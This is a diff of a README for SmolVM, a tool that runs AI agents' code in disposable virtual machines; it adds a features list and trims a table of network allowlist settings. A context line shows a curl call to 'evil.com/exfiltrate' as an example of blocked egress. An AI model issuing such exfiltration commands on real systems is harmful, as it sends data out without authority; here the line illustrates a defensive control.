@@ -22,6 +22,16 @@
 SmolVM gives AI agents their own disposable computer. Each sandbox is a lightweight virtual machine that boots in seconds, runs any code or command you throw at it, and disappears when you're done — nothing touches your host.
 
 
+## Features
+
+- **Sub-second boot** — VMs ready in ~500 ms.
+- **Hardware isolation** — Stronger security than containers.
+- **Network controls** — Domain allowlists for egress filtering.
+- **Browser sessions** — Full browser agents can see and control.
+- **Snapshots** — Save and restore VM state instantly.
+- **OpenClaw** — GUI Linux apps inside a sandbox.
+
+
 ## Use cases
 
 - **Run untrusted code safely.** Execute AI-generated code in an isolated sandbox instead of on your machine.
@@ -123,12 +133,7 @@ vm.run("curl https://api.openai.com/v1/models")    # allowed
 vm.run("curl https://evil.com/exfiltrate")         # blocked
 ```
 
-| Setting | Default | What it does |
-| --- | --- | --- |
-| `allowed_domains` | `["*"]` (all) | List of hostnames the sandbox can reach. Accepts URLs or bare domains. |
-| `allowed_http_methods` | `["*"]` (all) | HTTP methods the sandbox can use. *Not yet enforced — reserved for a future release.* |
-
-Set `allowed_domains` to `["*"]` (or omit `internet_settings` entirely) for unrestricted access. Network controls require the Firecracker backend. See [docs/concepts/network-egress-controls.md](docs/deep-dive/network-egress-controls.md) for how it works under the hood.
+See [docs/concepts/network-egress-controls.md](docs/deep-dive/network-egress-controls.md) for how it works under the hood.
 
 
 ## Examples
